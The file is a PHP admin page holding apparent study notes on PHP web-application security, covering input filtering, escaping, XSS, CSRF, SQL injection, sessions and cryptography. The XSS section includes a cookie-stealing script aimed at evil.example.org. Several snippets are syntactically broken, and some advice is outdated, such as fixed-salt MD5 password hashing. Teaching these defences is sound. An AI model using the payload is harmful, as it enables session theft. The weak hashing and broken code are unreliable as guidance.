<?php
require_once("../include/auth.php");
require_once("../include/auth_admin.php");

$page_title = "Site Admin";
?>

<?php include("../include/header.php"); ?>

<pre>

<H1>CH 1. Introduction</H1>

- Error reporting.
  Set to E_ALL at least. E_ALL | E_STRICT is the highest setting.
  Do this in php.ini, httpd.conf or .htaccess, or in php code like this:

  &lt;?php
  ini_set('error_reporting', E_ALL | E_STRICT);
  ini_set('display_errors', 'Off');
  ini_set('log_errors', 'On');
  ini_set('error_log', '/usr/local/apache/logs/error_log');
  ?&gt;

  Or handle one's own errors:
  &lt;php
  set_error_handler('my_error_handler');
  // or can pass a second paramter in PHP 5:
  // set_error_handler('my_error_handler', E_WARNING);

  function my_error_handler($number, $string, $file, $line, $context) 
  {
    $error = "==\nPHP ERROR\n==\n";
    $error .= "Number: [$number]\n";
    $error .= "String: [$string]\n";
    $error .= "File: [$file]\n";
    $error .= "Line: [$line]\n";
    $error .= "Context:\n" . print_r($context, TRUE) . "\n\n";

    error_log($error, 3, '/usr/local/apache/logs/error_log');
  }

  ?&gt;

- Principles: defense in depth, least privilege, simple, minimize exposure.
- Balance risk and usability
- Track data
- Filter input

  &lt;?php
  $clean = array();
  switch($_POST['color']) {
      case 'red':
      case 'green':
          $clean['color'] = $_POST['color'];
          break;
  }
  &gt;

  &lt;?php
  $clean = array();
  if (ctype_alnum($_POST['username'])) {
      $clean['username'] = $_POST['username'];
  }
  &gt;

  &lt;?php
  $filename = $_POST['filename'];
  while (strpos($filename, '..') !== FALSE) { // remove ..
    $filename = str_replace('..', '.', $filename);
  }
  &gt;

- Escape output
  &lt;?php
  // to screen
  $html = array();
  $html['username'] = htmlentities($clean['username'], ENT_QUOTES, 'UTF-8');
  echo "<p>Welcome back, {$html['username']}.</p>";

  // to database
  $mysql = array();
  $mysql['username'] = mysql_real_escape_string($clean['username']);
  $sql = "SELECT * FROM profile WHERE username = '{$mysql['username']}'";
  $result = mysql_query($sql);
  &gt;


<h1>CH 2. Forms and URLs</h1>

- Forms and Data
  - filtered data, tainted data.
  - use constant: define('EMAIL', '...'); echo EMAIL;

- Ways users send data to your app:
  - GET (URL)
  - POST (content of a request)
  - Cookie (HTTP header)

- Avoid using GET --&gt; causes URL attacks.

- Generate random password:
  $password = md5(uniqid(rand(), TRUE)); 

- Email pattern:
  &lt;?php
  session_start();

  $clean = array();
  $email_pattern = '/^[^@\s&lt;&>]+@([-a-z0-9]+\.)+[a-z]{2,}$/i';
  if (preg_match($email_pattern, $_POST['email'])) {
    $clean['email'] = $_POST['email'];
    $user = $_SESSION['user'];
    $new_password = md5(uniqid(rand(), TRUE));
    if ($_SESSION['verified']) {
      // update passwrod.
      mail($clean['email'], 'Your new password', $new_password);
    }
  }
  &gt;

- File upload attacks.
  - use is_uploaded_file() and move_uploaded_file() to improve security.

  &lt;form action="upload.php" method="POST" enctype="multipart/form-data">
  &lt;p>Please choose a file to upload:
  &lt;input type="hidden" name="MAX_FILE_SIZE" value="1024" />
  &lt;input type="file" name="attachment" />&ltbr/>
  &lt;input type="submit" value="Upload Attachment" />&lt;/p>
  &lt;/form>

  &lt;?php
  $filename = $_FILES['attachment']['tmp_name'];
  if (is_uploaded_file($filename)) { ... }

  $new_filename = "/path/to/attachment.txt";
  if (move_uploaded_file($filename, $new_filename)) {
    // can move only when $filename is an uploaded file.
  }
  &gt;

- Cross-Site scripting - one of the best known type of attacks.
  e.g., if a page display user code without escaping, then user can enter this:
  &lt;script>
  document.location = 'http://evil.example.org/steal.php?cookies=' + document.cookie;
  &lt;script>

  To avoid this, use this:
  $html['name'] = htmlentities($clean['name'], ENT_QUOTES, 'UTF-8');
  echo "{$html['name']}";

- Cross-Site Request Forgeries:
  &lt;img src="http://store.example.com/buy.php?item=pencil&quantity=50" />
  This will cause the user that visits this page to buy 50 pencils from store.example.com.
  Solution: use a token session for user to make the purchase.

- Spoofed Form Submissions.
  &lt;form action="http://example.org/path/process.php" method="post">

- Spoofed HTTP Requests. See <a href='http.php'>http.php</a>.


<h1>CH3. Database and SQL</h1>

- Exposed Access Credentials.
  &lt;?php
  $db_user = '..';
  $db_pass = '..';
  $db_host = '127.0.0.1';
  $db = mysql_connect($db_host, $db_user, $db_pass);
  ?>

  This file, if found and readable, will expose access credentials.
  - Solutions:
    - store this file out of document root.
    - use .htaccess file to deny access to this file type (say .inc).
    &lt;Files ~ "\.inc$">
        Order allow, deny
        Deny from all
    &lt;/Files>

- SQL Injection.
  - e.g., use of single quote (') and '--' to comment out rest of the query.
  - Solution: escape output.

  &lt;?php
  $mysql = array();
  $mysql['username'] = mysql_real_escape_string($clean['username']);
  $sql = "INSERT INTO user(last_name) VALUES ('{$mysql['username']}')";
  &gt;

  - Use an escaping function native to your databae if exists. 
    Otherwise, use addslashes() is a good last resort.
  - For some database libs, such as PEAR::DB, can use parameterized query:
  &lt;?php
  $sql = "INSERT INTO users (last_name) VALUES (?)';
  $dbh->query($sql, array($clean['last_name']));
  &gt;


<h1>CH4. Sessions and Cookies</h1>

- Cookie theft.
  - Cross-site scriping is a common way to steal cookies, since client-site scripts
    have access to cookies. Like in chapter 2. 

- Exposed session data.

- Session Fixation.

- Session Hijacking.


<h1>CH 5. Includes</h1>

- Exposed source file.
- Backdoor URLs.
- Filename manipulation.
- Code Injection.


<h1>CH 6. Files and Commands</h1>

- Traversing the file system.
  - should avoid/disable the use of "..".
- Remote File Risks
- Command Injection


<h1>CH 7. Authentication and Authorization</h1>

- Brute Force Attacks.
  - dictionary attack.
- Password sniffing
- Replay attacks
- Persistent logins.
  - login stored in persistent cookie on user machine.

<h1>CH 8. Shared hosting</h1>

- Exposed source code.
- Exposed sessin data.
  - session data is stored in /tmp.
  - In session.save_path, files begin with sess_ are session files.
- Session Injection.
- Filesystem browsing.
- Safe mode.

<h1>Appendix A. Configuration directives</h1>

- In phpinfo().
- allow_url_fopen
- disable_functions
- display_errors
- enble_dl: allows runtime loading of PHP extensions, can bypass open_basedir restrictions.
- error_reporting
- file_uploads
- log_errors
- magic_quotes_gpc
- memory_limit
- open_basedir
- register_globals
- safe_mode

<h1>Appendix B. Functions</h1>

- eval()
- exec(). Try to avoid using shell commands.
- file()
- file_get_contents()
- fopen()
- include
- passthru(). see exec().
- phpinfo()
- popen(). see exec().
- preg_replace(). 
- proc_oepn(). see exec().
- readfile().
- require
- shell_exec()
- system()

<h1>Appendix C. Cryptograph</h1>

- 4 types of cryptography:
  - symmetric
  - asymmetric (public key) .
  - cryptographic hash functions (message digests)
  - message authentication codes (MACs)

- Storing passwords.
  - use salt
  &lt;?php

  $salt = 'SHIFTLEFT';
  $password_hash = md5($salt . md5($password . $salt));
  ?>

- Using mcrypt - standard PHP extension for cryptography, supports many algorithsm.
  &lt;?php
    echo '&ltpre>' . print_r(mcrypt_list_algorithms(), TRUE) . '&lt;/pre>';

    mcrypt_encrypt($algorithm, $key, $cleartext, $mode, $iv);
    mcrypt_decrypt($algorithm, $key, $cleartext, $mode, $iv);
  ?>

- Storing credit card numbers.
  - store encrypted version.

- Encrypting session data.
  - chapter 8, session_set_save_handler(). wite custom session handling functions.


</pre>

<?php include("../include/footer.php"); ?>
